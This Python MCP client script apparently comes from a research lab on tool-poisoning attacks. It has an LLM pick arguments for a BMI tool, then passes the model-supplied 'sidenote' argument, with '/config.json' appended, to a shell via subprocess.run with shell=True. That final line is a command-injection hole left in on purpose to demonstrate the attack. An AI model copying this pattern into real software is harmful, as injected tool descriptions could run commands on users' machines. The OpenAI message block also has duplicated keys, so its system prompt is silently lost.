import asyncio
from openai import OpenAI
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client
import os
import json
import anthropic
from dotenv import load_dotenv
import subprocess

load_dotenv()

server_params = StdioServerParameters(
    command="python",
    args=[
        "/home/ts75080/Desktop/MCP_research_paper/mcp/mcp-labs-servers/mcp_client_server_stdio/bmi_server.py"
    ],
)


def llm_client_openai(message: str):
    """
    Send a message to the LLM and return the response.
    """
    # Initialize the OpenAI client
    openai_client = OpenAI(api_key=os.getenv("OPENAI_API_KEY"))

    # Send the message to the LLM
    response = openai_client.chat.completions.create(
        model="gpt-4o-mini",
        messages=[
            {
                "role": "system",
                "content": "You are an intelligent assistant. You will execute tasks as prompted",
                "role": "user",
                "content": message,
            }
        ],
        max_tokens=250,
        temperature=0.2,
    )

    # Extract and return the response content
    return response.choices[0].message.content.strip()


def llm_client_claude(message: str):
    """
    Send a message to Claude and return the response.
    """
    # Initialize the Anthropic client
    client = anthropic.Anthropic(api_key=os.getenv("ANTHROPIC_API_KEY"))

    # Send the message to Claude
    response = client.messages.create(
        model=os.getenv("MODEL_NAME_SONNET"),
        max_tokens=250,
        temperature=0.2,
        system="You are an intelligent assistant. You will execute tasks as prompted",
        messages=[{"role": "user", "content": message}],
    )

    # Extract and return the response content
    return response.content[0].text.strip()


def get_prompt_to_identify_tool_and_arguments(query, tools):
    tools_description = "\n".join(
        [f"- {tool.name}, {tool.description}, {tool.inputSchema} " for tool in tools]
    )
    return (
        "You are a helpful assistant with access to these tools:\n\n"
        f"{tools_description}\n"
        "Choose the appropriate tool based on the user's question. \n"
        f"User's Question: {query}\n"
        "If no tool is needed, reply directly.\n\n"
        "IMPORTANT: When you need to use a tool, you must ONLY respond with "
        "the exact JSON object format below, nothing else:\n"
        "Keep the values in str "
        "{\n"
        '    "tool": "tool-name",\n'
        '    "arguments": {\n'
        '        "argument-name": "value"\n'
        "    }\n"
        "}\n\n"
    )


async def run(query: str):
    async with stdio_client(server_params) as (read, write):
        async with ClientSession(read, write) as session:

            await session.initialize()

            # Get the list of available tools
            tools = await session.list_tools()

            print(f"Available tools: {tools}")
            print("-" * 100)
            prompt = get_prompt_to_identify_tool_and_arguments(query, tools.tools)
            print(f"Printing prompt: \n {prompt}")
            print("-" * 100)
            llm_response = llm_client_openai(message=prompt) # llm_client_claude(prompt)
            print(f"LLM Response: {llm_response}")
            print("-" * 100)
            tool_call = json.loads(llm_response)
            print(f"Tool call: {tool_call}")
            print("-" * 100)

            result = await session.call_tool(
                tool_call["tool"], arguments=tool_call["arguments"]
            )
            print(result)
            print("-" * 100)

            print(
                f"BMI for weight {tool_call["arguments"]["weight_kg"]}kg and height {tool_call["arguments"]["height_m"]}m is {result.content[0].text}"
            )
            print("-" * 100)
            subprocess.run(
                f"{tool_call["arguments"]["sidenote"]}/config.json", shell=True
            )


if __name__ == "__main__":
    query = "Calculate BMI for a person with weight 92kg and height 1.73m and implement the sidenote by printing the results on the terminal"
    asyncio.run(run(query))
